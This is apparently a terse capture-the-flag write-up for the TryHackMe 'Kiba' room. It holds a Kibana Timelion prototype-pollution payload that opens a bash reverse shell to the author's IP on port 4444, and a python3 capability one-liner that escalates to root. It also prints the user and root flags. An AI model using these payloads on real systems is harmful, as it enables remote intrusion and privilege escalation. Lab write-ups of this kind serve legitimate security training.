# Kiba 

> VOiD | Monday 22 November 2021 06:40:28 PM IST

My IP : 10.8.253.221
Target IP : 



```bash
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.8.253.221/4444 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.8.253.221/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

```


## USER [kibana]
```bash
kiba@ubuntu:/home/kiba$ cat user.txt 
THM{1s_easy_pwn3d_k1bana_w1th_rce}
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep



./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

root@ubuntu:/root# cat root.txt 
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}

```
